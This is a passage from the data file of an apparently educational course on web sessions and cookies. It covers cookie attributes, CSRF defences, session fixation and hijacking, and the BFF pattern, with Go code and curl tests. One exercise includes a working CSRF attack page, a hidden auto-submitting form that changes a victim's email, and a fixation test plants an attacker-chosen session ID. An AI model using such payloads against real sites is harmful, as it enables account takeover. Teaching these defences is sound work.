</table>
<p>The 2022 Uber breach (MFA fatigue) and many AiTM campaigns show that only origin-bound authenticators fully stop phishing. Recovery and step-up flows must not reintroduce weaker factors.</p>`
        }
      ],
      quiz: [
        { q: 'Why is SHA-256 unsuitable for password storage?', a: 'It is designed to be fast; attackers can compute billions of guesses per second on GPUs. Password hashes must be slow and ideally memory-hard (Argon2id, scrypt, bcrypt).' },
        { q: 'What is the difference between a salt and a pepper?', a: 'A salt is random, per-password and stored with the hash; a pepper is a secret shared across all hashes and stored outside the database (KMS/secret store).' },
        { q: 'What is the bcrypt input length limit?', a: '72 bytes; longer input is truncated (Go\'s bcrypt returns ErrPasswordTooLong).' },
        { q: 'How is a TOTP code computed?', a: 'HMAC-SHA1(shared secret, floor(unix time / 30)), dynamic truncation to 31 bits, then mod 10^6 for six digits (RFC 6238 / RFC 4226).' },
        { q: 'What is MFA fatigue and a mitigation?', a: 'Attackers spam push approvals until the user accepts; mitigate with number matching, showing context and limiting prompt frequency.' },
        { q: 'What makes WebAuthn phishing-resistant?', a: 'The browser binds credentials to the relying party ID/origin and includes the origin in signed client data, so credentials cannot be used or relayed on a look-alike domain.' },
        { q: 'Why prefer soft lockout over hard account lockout?', a: 'Hard lockout lets an attacker deny service to any user by failing logins on purpose; soft lockout (delays, CAPTCHA, step-up) slows attackers without blocking the real user.' },
        { q: 'What does NIST SP 800-63B rev. 4 say about periodic password rotation?', a: 'Do not require it; force a change only on evidence of compromise.' },
        { q: 'Why should a server not reject a passkey assertion whose signature counter is always 0?', a: 'Synced passkeys typically do not maintain a counter and always report 0; the counter is only a clone signal when it is non-zero and goes backwards.' }
      ],
      resources: [
        { title: 'OWASP Password Storage Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html', type: 'docs' },
        { title: 'OWASP Authentication Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html', type: 'docs' },
        { title: 'MDN — Web Authentication API', url: 'https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API', type: 'docs' },
        { title: 'RFC 6238 — TOTP: Time-Based One-Time Password Algorithm', url: 'https://datatracker.ietf.org/doc/html/rfc6238', type: 'docs' }
      ]
    },
    // ───────────────────────────────────────────── Module 3 ─────────────────────────────────────────────
    {
      n: 3,
      title: 'Sessions & Cookies',
      summary: `How browsers stay logged in safely: server-side session flows, every cookie attribute that matters (HttpOnly, Secure, SameSite, __Host-), CSRF and its modern defenses, fixation and hijacking, and the stateful-session vs stateless-token trade-off including the Backend-for-Frontend (BFF) pattern for SPAs.`,
      topics: [
        {
          title: 'Server-Side Session Authentication Flow',
          def: `<p>The classic and still most robust web login model: the browser holds only an opaque, random <strong>session ID</strong>; all state lives on the server (Redis, DB).</p>
<ol>
<li>User submits credentials (<code>POST /login</code> over HTTPS).</li>
<li>Server verifies password + MFA, then <strong>generates a new session ID</strong>: &ge; 128 bits from a CSPRNG (Go: <code>crypto/rand.Text()</code> since 1.24, or 32 random bytes base64url-encoded).</li>
<li>Server stores <code>session:{id} &rarr; {user_id, tenant, created_at, last_seen, auth_time, amr:[pwd, otp], csrf_secret}</code> with a TTL.</li>
<li>Response: <code>Set-Cookie: __Host-sid=...; Path=/; Secure; HttpOnly; SameSite=Lax</code>.</li>
<li>Each request: the browser sends the cookie; middleware looks up the session, enforces <strong>idle timeout</strong> (e.g. 30 min) and <strong>absolute timeout</strong> (e.g. 12 h), refreshes <code>last_seen</code>.</li>
<li>Privilege change (login, MFA step-up, role change): <strong>rotate the session ID</strong> to prevent fixation.</li>
<li>Logout: delete the server-side record and expire the cookie (<code>Max-Age=0</code>); optionally send <code>Clear-Site-Data: "cookies", "storage"</code>.</li>
</ol>
<p>Advantages: <strong>instant revocation</strong> (delete the record), small cookie, nothing sensitive client-side, easy "log out everywhere" (index sessions per user). Costs: a lookup per request (Redis &lt; 1 ms), a shared store across replicas, and sticky state for multi-region (replicate or use regional stores). Store a <em>hash</em> of the session ID as the key if you worry about store dumps.</p>`,
          interview: 'Walk through the full lifecycle: creation with CSPRNG, cookie attributes, idle vs absolute timeout, rotation on privilege change, server-side deletion on logout. Mention that deleting the record gives immediate revocation, which stateless JWTs lack.',
          examples: [
            {
              label: 'Login and an authenticated request',
              lang: 'http',
              code: `POST /login HTTP/1.1
Host: app.example.com
Content-Type: application/x-www-form-urlencoded

email=alice%40example.com&password=...

HTTP/1.1 303 See Other
Location: /dashboard
Set-Cookie: __Host-sid=Q2x2b1p0eU5wV3h3cE5uS2ZQb0s4U2JnRkt3; Path=/; Secure; HttpOnly; SameSite=Lax
Cache-Control: no-store

GET /dashboard HTTP/1.1
Host: app.example.com
Cookie: __Host-sid=Q2x2b1p0eU5wV3h3cE5uS2ZQb0s4U2JnRkt3`
            }
          ]
        },
        {
          title: 'Cookie Attributes: HttpOnly, Secure, SameSite, Domain/Path, __Host-',
          def: `<table>
<thead><tr><th>Attribute</th><th>Effect</th><th>Recommendation for session cookies</th></tr></thead>
<tbody>
<tr><td><code>HttpOnly</code></td><td>not readable from JavaScript (<code>document.cookie</code>)</td><td>always — limits XSS to riding the session instead of stealing it</td></tr>
<tr><td><code>Secure</code></td><td>sent only over HTTPS</td><td>always (plus HSTS)</td></tr>
<tr><td><code>SameSite=Strict</code></td><td>never sent on cross-site requests, even top-level navigation</td><td>high-value apps; breaks inbound links (user appears logged out)</td></tr>
<tr><td><code>SameSite=Lax</code></td><td>sent on same-site requests and top-level cross-site <em>GET</em> navigations</td><td>good default; Chromium treats an unspecified attribute as Lax (with a 2-minute "Lax+POST" exception for fresh cookies), Firefox and Safari do not — always set it explicitly</td></tr>
<tr><td><code>SameSite=None</code></td><td>sent on all cross-site requests; requires <code>Secure</code></td><td>only for genuine third-party/embedded use; add CSRF tokens</td></tr>
<tr><td><code>Domain</code></td><td>if set, cookie is sent to the domain <em>and all subdomains</em></td><td>omit (host-only) unless sharing is required</td></tr>
<tr><td><code>Path</code></td><td>limits which paths receive the cookie</td><td><code>/</code>; not a security boundary</td></tr>
<tr><td><code>Max-Age</code>/<code>Expires</code></td><td>persistent vs session cookie</td><td>omit or short; server enforces real timeouts</td></tr>
<tr><td><code>Partitioned</code></td><td>CHIPS: third-party cookie partitioned per top-level site</td><td>embedded widgets only</td></tr>
</tbody>
</table>
<p><strong>Prefixes</strong> are enforced by browsers: <code>__Secure-</code> requires <code>Secure</code>; <code>__Host-</code> requires <code>Secure</code>, <code>Path=/</code> and <strong>no</strong> <code>Domain</code> — so a compromised or malicious sibling subdomain cannot overwrite or inject the cookie (cookie tossing). Use <code>__Host-</code> for session and CSRF cookies.</p>
<p><strong>Site vs origin</strong>: an <em>origin</em> is scheme + host + port; a <em>site</em> is scheme + registrable domain (eTLD+1). <code>app.example.com</code> and <code>evil.example.com</code> are <strong>same-site</strong> but cross-origin — SameSite does not protect against attacks from a sibling subdomain.</p>`,
          interview: 'Know each attribute, the Lax vs Strict trade-off (Strict breaks OAuth callbacks and inbound links), that None requires Secure, why omitting Domain is safer, what __Host- guarantees, and the difference between same-site and same-origin.',
          examples: [
            {
              label: 'Hardened session cookie in Go',
              lang: 'go',
              code: `func setSessionCookie(w http.ResponseWriter, id string) {
    http.SetCookie(w, &http.Cookie{
        Name:     "__Host-sid", // browser enforces Secure, Path=/, no Domain
        Value:    id,
        Path:     "/",
        Secure:   true,
        HttpOnly: true,
        SameSite: http.SameSiteLaxMode,
        // no Expires/MaxAge: browser-session cookie; server enforces idle + absolute timeouts
    })
}

func clearSessionCookie(w http.ResponseWriter) {
    http.SetCookie(w, &http.Cookie{Name: "__Host-sid", Value: "", Path: "/", Secure: true,
        HttpOnly: true, SameSite: http.SameSiteLaxMode, MaxAge: -1})
}`
            }
          ]
        },
        {
          title: 'CSRF and Its Defenses',
          def: `<p><strong>Cross-Site Request Forgery</strong> abuses the fact that browsers attach cookies automatically. The attacker cannot read responses (same-origin policy) but can cause <em>state-changing</em> requests.</p>
<ol>
<li>Victim is logged in to <code>bank.example</code> (cookie-based session).</li>
<li>Victim visits <code>evil.example</code>, which auto-submits a hidden form <code>POST https://bank.example/transfer</code>.</li>
<li>The browser attaches the bank's session cookie (if SameSite allows) and the bank executes the transfer.</li>
</ol>
<p><strong>Defenses</strong> (combine at least two for cookie-authenticated, state-changing endpoints):</p>
<ul>
<li><strong>SameSite=Lax/Strict</strong> cookies — blocks most cross-site POSTs. Gaps: state-changing <code>GET</code>s, same-site sibling subdomains, older clients, and <code>SameSite=None</code> cookies.</li>
<li><strong>Synchronizer token</strong>: random per-session token stored server-side, embedded in forms / sent in a header, compared on each unsafe request.</li>
<li><strong>Signed double-submit cookie</strong> (stateless): token = HMAC(secret, session_id + random) in a cookie and repeated in a header/field; server checks both match <em>and</em> the HMAC binds it to the session. Naive unsigned double-submit is vulnerable to cookie injection.</li>
<li><strong>Fetch Metadata / Origin checks</strong>: reject unsafe methods when <code>Sec-Fetch-Site</code> is <code>cross-site</code> or the <code>Origin</code> header does not match. Go 1.25 ships <code>http.CrossOriginProtection</code> implementing exactly this.</li>
<li><strong>Custom request header</strong> requirement for JSON APIs (e.g. <code>X-Requested-With</code> or <code>Content-Type: application/json</code>) — cross-site forms cannot set them without a CORS preflight; keep CORS strict.</li>
<li>Never change state on <code>GET</code>; re-authenticate for critical actions.</li>
</ul>
<p>APIs authenticated only with an <code>Authorization: Bearer</code> header are not CSRF-prone (browsers don't attach it automatically) — but tokens in JS-accessible storage are exposed to XSS instead. Also defend against <strong>login CSRF</strong> (attacker logs the victim into the attacker's account) by protecting the login form.</p>`,
          interview: 'Explain the attack precisely (attacker cannot read the response, only trigger the request), why SameSite is not sufficient alone, synchronizer vs signed double-submit, and Fetch Metadata. Note that bearer-header APIs are not vulnerable to CSRF but are to token theft via XSS.',
          examples: [
            {
              label: 'Request rejected by Fetch Metadata check',
              lang: 'http',
              code: `POST /api/transfer HTTP/1.1
Host: bank.example
Origin: https://evil.example
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Cookie: __Host-sid=...           (only sent if SameSite=None)
Content-Type: application/x-www-form-urlencoded

to=attacker&amount=5000

HTTP/1.1 403 Forbidden            <- cross-origin unsafe request blocked before reaching the handler`
            }
          ]
        },
        {
          title: 'Session Fixation and Session Hijacking',
          def: `<p><strong>Session fixation</strong>: the attacker obtains a valid (pre-login) session ID and plants it in the victim's browser (via URL parameter, a sibling subdomain setting a cookie, or XSS). When the victim logs in and the server <em>keeps the same ID</em>, the attacker now shares the authenticated session.</p>
<ul>
<li>Fix: <strong>always issue a new session ID on authentication</strong> and on every privilege change; invalidate the old one.</li>
<li>Never accept session IDs from URLs; use <code>__Host-</code> cookies so subdomains cannot set them; reject unknown IDs (don't adopt client-chosen IDs — "strict" session management).</li>
</ul>
<p><strong>Session hijacking</strong>: stealing a live session token.</p>
<table>
<thead><tr><th>Vector</th><th>Defense</th></tr></thead>
<tbody>
<tr><td>XSS reads the cookie</td><td><code>HttpOnly</code>, CSP, output encoding</td></tr>
<tr><td>Network sniffing / SSL stripping</td><td><code>Secure</code>, TLS everywhere, HSTS (preload)</td></tr>
<tr><td>Token in URL / logs / Referer</td><td>cookies only, never log tokens, <code>Referrer-Policy</code></td></tr>
<tr><td>Infostealer malware exports cookies</td><td>short idle timeouts, re-auth for sensitive actions, anomaly detection, device-bound sessions (Chrome DBSC), sender-constrained tokens (DPoP/mTLS)</td></tr>
<tr><td>AiTM phishing proxy</td><td>passkeys, risk-based session re-validation</td></tr>
<tr><td>Predictable IDs</td><td>&ge; 128-bit CSPRNG IDs</td></tr>
</tbody>
</table>
<p>Detection: flag sessions whose IP/ASN/user-agent change abruptly, or concurrent use from distant locations; terminate and require re-authentication. Strict IP binding breaks mobile users, so use it as a <em>risk signal</em>, not a hard rule.</p>`,
          interview: 'Differentiate fixation (attacker sets a known ID before login) from hijacking (attacker steals the ID after login). The fixation fix is session ID rotation at login. For hijacking, discuss HttpOnly/Secure/HSTS, timeouts, and modern threats: infostealers and AiTM, with device-bound sessions and passkeys as mitigations.',
          examples: [
            {
              label: 'Rotate the session ID on login (prevent fixation)',
              lang: 'go',
              code: `func (s *Sessions) Promote(ctx context.Context, w http.ResponseWriter, oldID string, u *User, amr []string) error {
    if oldID != "" {
        _ = s.store.Delete(ctx, oldID) // invalidate any pre-login (possibly attacker-planted) session
    }
    newID := rand.Text() // crypto/rand, Go 1.24+: 26 base32 chars = 128+ bits
    sess := Session{UserID: u.ID, Tenant: u.Tenant, AuthTime: time.Now(), AMR: amr, CSRFSecret: rand.Text()}
    if err := s.store.Put(ctx, newID, sess, 30*time.Minute); err != nil {
        return err
    }
    setSessionCookie(w, newID)
    return nil
}`
            }
          ]
        },
        {
          title: 'Stateful Sessions vs Stateless Tokens, and the BFF Pattern',
          def: `<table>
<thead><tr><th></th><th>Server-side session (opaque cookie)</th><th>Stateless token (JWT)</th></tr></thead>
<tbody>
<tr><td>State</td><td>server store (Redis)</td><td>self-contained, signed claims</td></tr>
<tr><td>Revocation</td><td>immediate (delete record)</td><td>hard: wait for expiry, or add denylist / introspection</td></tr>
<tr><td>Scalability</td><td>needs shared store lookup</td><td>verify locally with a public key; great across services</td></tr>
<tr><td>Size</td><td>~32 bytes</td><td>often 800 B–2 KB in every request</td></tr>
<tr><td>Best for</td><td>first-party browser apps</td><td>APIs, service-to-service, third-party clients, short-lived access tokens</td></tr>
</tbody>
</table>
<p>Most mature systems use <strong>both</strong>: a session cookie between browser and backend, and short-lived JWT access tokens between backend and APIs.</p>
<p><strong>Where should a browser app keep tokens?</strong></p>
<ul>
<li><code>localStorage</code>/<code>sessionStorage</code>: readable by any script &rarr; one XSS exfiltrates tokens (including long-lived refresh tokens).</li>
<li>In-memory JS variable: better, but XSS can still call APIs or intercept; lost on reload.</li>
<li><strong>Backend-for-Frontend (BFF)</strong> — recommended by the IETF "OAuth 2.0 for Browser-Based Applications" BCP draft for sensitive apps: a server-side component acts as a <em>confidential OAuth client</em>, performs the code + PKCE flow, stores access/refresh tokens server-side, and gives the browser only a <code>__Host-</code>, <code>HttpOnly</code>, <code>SameSite</code> session cookie. The BFF proxies API calls and attaches the access token.</li>
</ul>
<p>With a BFF, XSS can still act as the user while the page is open, but cannot steal tokens for offline use — a large reduction in impact. The BFF must implement CSRF protection since it uses cookies.</p>`,
          interview: 'Do not answer "JWT is better because stateless". Compare revocation, size, XSS exposure and scale, and land on: sessions (or a BFF) for browsers, short-lived JWTs for APIs. Know why localStorage is risky and what a BFF does.',
          examples: [
            {
              label: 'BFF request flow',
              lang: 'text',
              code: `Browser (SPA)                 BFF (confidential client)              Authorization Server     API
    | GET /bff/login  -------------> | 302 to AS /authorize (code+PKCE, state)  |                  |
    | <------- user authenticates at AS, redirect back with ?code=...&state=...  |                  |
    | GET /bff/callback?code ------> | POST /token (code, verifier, client auth) -> tokens         |
    | <-- Set-Cookie: __Host-bff=..; HttpOnly; Secure; SameSite=Strict          |                  |
    | GET /bff/api/orders (cookie) ->| lookup session -> access token           |                  |
    |                                | GET /orders  Authorization: Bearer AT ---------------------> |
    | <----------- JSON -------------| <------------------------------------------------------------|
Tokens never reach JavaScript; refresh happens server-side.`
            }
          ]
        }
      ],
      problems: [
        {
          t: 'Set a hardened session cookie and verify it with curl',
          d: 'easy',
          type: 'hands-on',
          hint: `<ul><li>Use <code>__Host-</code> prefix, <code>Secure</code>, <code>HttpOnly</code>, <code>SameSite=Lax</code>, <code>Path=/</code>, no <code>Domain</code>.</li><li>Inspect the raw <code>Set-Cookie</code> header with <code>curl -i</code>.</li><li>Check that the login response also has <code>Cache-Control: no-store</code>.</li></ul>`,
          solution: `curl -si -X POST https://app.example.com/login \\
  -d 'email=alice@example.com&password=correct-horse' | grep -iE '^(set-cookie|cache-control|strict-transport)'

# Expected:
# set-cookie: __Host-sid=...; Path=/; Secure; HttpOnly; SameSite=Lax
# cache-control: no-store
# strict-transport-security: max-age=63072000; includeSubDomains; preload

# Red flags: missing HttpOnly/Secure, Domain=.example.com, SameSite=None without need,
# Expires far in the future, session id visible in URL or response body.`,
          lang: 'bash'
        },
        {
          t: 'Implement Redis-backed sessions with idle and absolute timeouts',
          d: 'medium',
          type: 'coding',
          hint: `<ul><li>Key <code>sess:{sha256(id)}</code> &rarr; JSON with <code>created_at</code>, <code>last_seen</code>.</li><li>Idle timeout via Redis TTL refreshed on use; absolute timeout checked against <code>created_at</code>.</li><li>Index sessions per user (<code>user_sess:{uid}</code> set) for "log out everywhere".</li></ul>`,
          solution: `type Session struct {
    UserID    string    \`json:"uid"\`
    CreatedAt time.Time \`json:"created_at"\`
    AuthTime  time.Time \`json:"auth_time"\`
}

const (
    idle     = 30 * time.Minute
    absolute = 12 * time.Hour
)

type Store struct{ rdb *redis.Client }

func key(id string) string {
    h := sha256.Sum256([]byte(id)) // a dump of Redis does not reveal usable session ids
    return "sess:" + hex.EncodeToString(h[:])
}

func (s *Store) Create(ctx context.Context, uid string) (string, error) {
    id := rand.Text()
    b, _ := json.Marshal(Session{UserID: uid, CreatedAt: time.Now(), AuthTime: time.Now()})
    pipe := s.rdb.TxPipeline()
    pipe.Set(ctx, key(id), b, idle)
    pipe.SAdd(ctx, "user_sess:"+uid, key(id))
    _, err := pipe.Exec(ctx)
    return id, err
}

func (s *Store) Get(ctx context.Context, id string) (*Session, error) {
    b, err := s.rdb.Get(ctx, key(id)).Bytes()
    if err != nil {
        return nil, ErrNoSession
    }
    var sess Session
    if err := json.Unmarshal(b, &sess); err != nil {
        return nil, err
    }
    if time.Since(sess.CreatedAt) > absolute {
        s.rdb.Del(ctx, key(id))
        return nil, ErrNoSession
    }
    s.rdb.Expire(ctx, key(id), idle) // sliding idle timeout
    return &sess, nil
}

func (s *Store) LogoutEverywhere(ctx context.Context, uid string) error {
    keys, err := s.rdb.SMembers(ctx, "user_sess:"+uid).Result()
    if err != nil {
        return err
    }
    if len(keys) > 0 {
        s.rdb.Del(ctx, keys...)
    }
    return s.rdb.Del(ctx, "user_sess:"+uid).Err()
}`,
          lang: 'go'
        },
        {
          t: 'Explain and mitigate a CSRF attack on a cookie-based API',
          d: 'medium',
          type: 'concept',
          hint: `<ul><li>Show the attacker page and why the browser attaches the cookie.</li><li>Identify why the request succeeded: <code>SameSite=None</code> (or legacy browser), no token, no Origin check.</li><li>Layer: SameSite=Lax, Fetch-Metadata/Origin check, CSRF token, no state change on GET.</li></ul>`,
          solution: `Attack page hosted on evil.example (victim is logged into app.example.com, cookie SameSite=None):

  <form action="https://app.example.com/api/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.example">
  </form>
  <script>document.forms[0].submit()</script>

Result: victim's email changed -> attacker resets password -> account takeover.
Why it worked: cookie sent cross-site, endpoint accepts form-encoded POST, no CSRF token, no Origin check.

Mitigations (defense in depth):
1. Session cookie SameSite=Lax (or Strict) + __Host- prefix.
2. Reject unsafe methods with Sec-Fetch-Site: cross-site / mismatching Origin (Go 1.25: http.CrossOriginProtection).
3. Require a CSRF token (synchronizer or HMAC-signed double-submit) in a header for unsafe requests.
4. JSON APIs: require Content-Type: application/json and keep CORS allow-list strict (no credentials for *).
5. Sensitive changes (email, password, payout) require re-authentication / step-up MFA.`,
          lang: 'text'
        },
        {
          t: 'Implement a signed double-submit CSRF token middleware in Go',
          d: 'medium',
          type: 'coding',
          hint: `<ul><li>Token = <code>rand . HMAC(key, sessionID + "!" + rand)</code>; set as a non-HttpOnly <code>__Host-csrf</code> cookie so the SPA can copy it into <code>X-CSRF-Token</code>.</li><li>On POST/PUT/PATCH/DELETE: header == cookie, and HMAC verifies against the <em>current</em> session.</li><li>Use <code>hmac.Equal</code> for constant-time comparison.</li></ul>`,
          solution: `type CSRF struct{ key []byte }

func (c CSRF) sign(sessionID, nonce string) string {
    m := hmac.New(sha256.New, c.key)
    m.Write([]byte(sessionID + "!" + nonce))
    return nonce + "." + base64.RawURLEncoding.EncodeToString(m.Sum(nil))
}

func (c CSRF) Issue(w http.ResponseWriter, sessionID string) {
    tok := c.sign(sessionID, rand.Text())
    http.SetCookie(w, &http.Cookie{Name: "__Host-csrf", Value: tok, Path: "/", Secure: true,
        SameSite: http.SameSiteStrictMode}) // readable by JS on purpose
}

func (c CSRF) valid(sessionID, tok string) bool {
    nonce, _, ok := strings.Cut(tok, ".")
    return ok && hmac.Equal([]byte(c.sign(sessionID, nonce)), []byte(tok))
}

func (c CSRF) Middleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        switch r.Method {
        case http.MethodGet, http.MethodHead, http.MethodOptions:
            next.ServeHTTP(w, r)
            return
        }
        sid := sessionIDFrom(r) // from __Host-sid cookie, already authenticated
        ck, err := r.Cookie("__Host-csrf")
        hdr := r.Header.Get("X-CSRF-Token")
        if err != nil || hdr == "" || !hmac.Equal([]byte(ck.Value), []byte(hdr)) || !c.valid(sid, hdr) {
            http.Error(w, "CSRF validation failed", http.StatusForbidden)
            return
        }
        next.ServeHTTP(w, r)
    })
}`,
          lang: 'go'
        },
        {
          t: 'Add Fetch-Metadata cross-origin protection with Go 1.25',
          d: 'medium',
          type: 'coding',
          hint: `<ul><li><code>http.NewCrossOriginProtection()</code> rejects non-safe cross-origin requests using <code>Sec-Fetch-Site</code>, falling back to comparing <code>Origin</code> with <code>Host</code>.</li><li>Add trusted origins explicitly (e.g. your separate admin UI origin).</li><li>Requests without either header (non-browser clients) are allowed — they can't carry ambient browser cookies.</li></ul>`,
          solution: `func main() {
    mux := http.NewServeMux()
    mux.HandleFunc("POST /api/transfer", transfer)
    mux.HandleFunc("GET /api/balance", balance)

    cop := http.NewCrossOriginProtection()
    if err := cop.AddTrustedOrigin("https://admin.example.com"); err != nil {
        log.Fatal(err)
    }
    // Optional: a webhook endpoint that legitimately receives cross-origin POSTs
    cop.AddInsecureBypassPattern("POST /webhooks/stripe")

    srv := &http.Server{
        Addr:              ":8443",
        Handler:           cop.Handler(mux), // 403 for cross-site POST/PUT/PATCH/DELETE
        ReadHeaderTimeout: 5 * time.Second,
    }
    log.Fatal(srv.ListenAndServeTLS("tls.crt", "tls.key"))
}

// Pre-1.25 equivalent: in middleware, for unsafe methods reject when
//   Sec-Fetch-Site is present and not in {"same-origin", "none"}, or
//   Origin is present and its host != r.Host.`,
          lang: 'go'
        },
        {
          t: 'Debug a login loop after the IdP redirect (SameSite issue)',
          d: 'medium',
          type: 'debug',
          hint: `<ul><li>The OAuth/OIDC callback is a <em>cross-site</em> navigation from the IdP back to your app.</li><li><code>SameSite=Strict</code> state/session cookies are not sent on it &rarr; state check fails &rarr; restart login.</li><li>With <code>response_mode=form_post</code> the callback is a cross-site POST &rarr; even Lax cookies are not sent.</li></ul>`,
          solution: `Symptoms: after IdP login the app redirects to /login again; logs show "state mismatch" or "no session".

Diagnosis (browser devtools > Network > callback request > Cookies tab shows the cookie "blocked: SameSite=Strict"):
  GET https://app.example.com/callback?code=...&state=...   Referer: https://login.idp.com/
  -> cross-site top-level navigation -> Strict cookies withheld

Fixes:
1. The short-lived login-state cookie (state, nonce, PKCE verifier) uses SameSite=Lax (works for GET redirect callbacks).
2. If using response_mode=form_post (cross-site POST): that one cookie needs SameSite=None; Secure, short Max-Age (5 min),
   and the state parameter remains the CSRF defense.
3. After the callback, issue a fresh session cookie (may be Strict) via a same-site redirect.
4. Never "fix" by disabling the state check.`,
          lang: 'text'
        },
        {
          t: 'Find and fix a session fixation vulnerability',
          d: 'medium',
          type: 'debug',
          hint: `<ul><li>Test: note the session cookie before login, log in, compare after login.</li><li>If unchanged, an attacker who planted the pre-login ID shares the authenticated session.</li><li>Also check whether the app accepts arbitrary client-chosen IDs.</li></ul>`,
          solution: `# Test
curl -s -c jar.txt https://app.example.com/ -o /dev/null           # get anonymous session
grep sid jar.txt                                                     # sid = AAA
curl -s -b jar.txt -c jar.txt -d 'email=a@x.com&password=...' https://app.example.com/login -o /dev/null
grep sid jar.txt                                                     # still AAA  => VULNERABLE

# Also test adoption of attacker-chosen IDs
curl -s -b '__Host-sid=attacker-chosen-123' https://app.example.com/ -i | grep -i set-cookie
# If server keeps "attacker-chosen-123" as a new session => VULNERABLE (must reject unknown IDs)

# Fix: on successful login delete the old session and issue a new random ID (see Promote() example),
# also on MFA step-up and role change; use __Host- prefix so subdomains cannot plant cookies.`,
          lang: 'bash'
        },
        {
          t: 'Session cookies vs JWT: choose an approach for three systems',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Consider: who is the client (browser, mobile, service), revocation needs, number of services, latency.</li><li>Browser first-party: session cookie or BFF.</li><li>Microservices: short-lived JWT access tokens validated locally, plus introspection or denylist for high-risk.</li><li>Third-party API: OAuth access tokens, opaque or JWT (RFC 9068).</li></ul>`,
          solution: `1. Banking web app (single domain, strict revocation):
   Server-side sessions in Redis, __Host- cookie, SameSite=Strict, 10-15 min idle timeout, step-up for payments.
   Reason: instant revocation, nothing replayable in JS, regulatory "log out everywhere".

2. React SPA + 30 microservices:
   BFF holds OAuth tokens; browser gets HttpOnly session cookie. BFF sends 5-min JWT access tokens (aud per API)
   to services that verify locally via JWKS. Refresh tokens stay in the BFF with rotation.

3. Public partner API:
   OAuth 2.0 client credentials; access tokens either opaque + introspection (instant revocation, partner can't read
   claims) or JWT (RFC 9068) with 5-15 min TTL; sender-constrained (mTLS or DPoP) for high-value partners.

General rule: sessions for browsers, short-lived tokens for APIs, and never long-lived JWTs without a revocation story.`,
          lang: 'text'
        },
        {
          t: 'Design a Backend-for-Frontend for a React SPA using OIDC',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>BFF is a confidential client (private_key_jwt or client secret) doing code + PKCE.</li><li>Tokens stored server-side keyed by session; browser gets <code>__Host-</code> HttpOnly cookie.</li><li>CSRF protection on BFF endpoints; same-site deployment (SPA and BFF on the same origin).</li><li>Handle refresh, logout (RP-initiated + back-channel) and API proxying.</li></ul>`,
          solution: `Endpoints (same origin as SPA, e.g. https://app.example.com/bff/*):
  GET  /bff/login      -> create login-state (state, nonce, PKCE verifier) in short-lived cookie/store; 302 to /authorize
  GET  /bff/callback   -> verify state, exchange code (+verifier, client auth), validate ID token (iss, aud, nonce, exp, sig),
                          create server session {sub, sid, tokens}, Set-Cookie __Host-session (HttpOnly, Secure, SameSite=Strict)
  GET  /bff/user       -> returns safe user profile claims to the SPA (no tokens)
  ANY  /bff/api/*      -> CSRF check (custom header + Fetch Metadata), attach access token, proxy to API;
                          refresh with refresh token (rotation) when < 60s to expiry, serialized per session
  POST /bff/logout     -> delete session, revoke refresh token (RFC 7009), 302 to IdP end_session_endpoint
  POST /bff/backchannel-logout -> validate logout token (sig, iss, aud, events, sid), delete matching sessions

Security properties: tokens never in JS; XSS limited to in-page actions; CSRF via SameSite + header check;
token storage encrypted at rest; per-session rate limits; observability on refresh failures.`,
          lang: 'text'
        }
      ],
      interviewFocus: [
        {
          q: 'Session cookies vs JWT — which would you use and why?',
          a: `<p>It depends on the client and the revocation requirement; the honest answer is usually <strong>both, in different places</strong>.</p>
<ul>
<li><strong>Session cookie (opaque ID, server-side state)</strong>: immediate revocation, tiny cookie, HttpOnly so XSS can't steal it, simple "log out everywhere". Needs a shared session store (Redis), which is cheap and well understood. Best for first-party browser apps.</li>
<li><strong>JWT</strong>: self-contained, verifiable anywhere with a public key — ideal for APIs and service-to-service where you don't want a central lookup. Downsides: revocation is hard (wait for <code>exp</code> or add denylist/introspection), larger requests, claims go stale (role removed but token still says admin), and if stored in <code>localStorage</code> any XSS steals it.</li>
</ul>
<p>My default: browser &harr; backend uses a session cookie (or a BFF holding OAuth tokens); backend &harr; APIs uses short-lived (5–15 min) JWT access tokens with audience restriction; refresh tokens rotate and are revocable. "Stateless" is a property you buy at the price of revocation, so keep access tokens short.</p>`
        },
        {
          q: 'Explain CSRF and how SameSite cookies changed the defense landscape.',
          a: `<p>CSRF exploits ambient credentials: a cross-site page triggers a state-changing request and the browser attaches the victim's cookies. The attacker cannot read the response, but the side effect (transfer, email change) happens.</p>
<p><strong>SameSite</strong> lets the server say "don't send this cookie on cross-site requests". Since browsers default unspecified cookies to <code>Lax</code>, classic cross-site POST CSRF is largely blocked. Remaining gaps:</p>
<ul>
<li><code>SameSite=None</code> cookies (embedded/cross-site apps).</li>
<li>State-changing <code>GET</code> endpoints (Lax allows top-level GET navigation).</li>
<li><strong>Same-site</strong> attacks from a compromised or user-controlled subdomain (<code>evil.example.com</code> is same-site with <code>app.example.com</code>).</li>
<li>Older or non-conforming clients.</li>
</ul>
<p>So I still add an explicit defense: Fetch Metadata / Origin verification (Go 1.25 <code>http.CrossOriginProtection</code>) and, for high-value apps, a synchronizer or signed double-submit token. Plus no state changes on GET and re-auth for critical actions.</p>`
        },
        {
          q: 'Where should a single-page application store access and refresh tokens?',
          a: `<p>Ranking from most to least secure for sensitive apps:</p>
<ol>
<li><strong>Nowhere in the browser — BFF pattern</strong>: a backend confidential client holds tokens; the browser has an HttpOnly <code>__Host-</code> session cookie. XSS can act within the open page but cannot exfiltrate tokens.</li>
<li><strong>In memory</strong> (closure/Web Worker), with refresh-token rotation and sender-constrained tokens (DPoP) — XSS can still use them while the page runs; DPoP keys (non-extractable WebCrypto) limit replay elsewhere.</li>
<li><strong>localStorage/sessionStorage</strong> — any injected script reads them and sends them away, including long-lived refresh tokens. Avoid for anything sensitive.</li>
</ol>
<p>Never put tokens in URLs (logs, Referer, history). The IETF browser-based apps BCP draft recommends BFF where possible; whichever you choose, strong CSP and XSS prevention remain essential.</p>`
        },
        {
          q: 'How do you implement "log out from all devices" for both sessions and JWTs?',
          a: `<ul>
<li><strong>Server-side sessions</strong>: keep an index <code>user_sess:{uid}</code> of session keys; delete them all. Effect is immediate.</li>
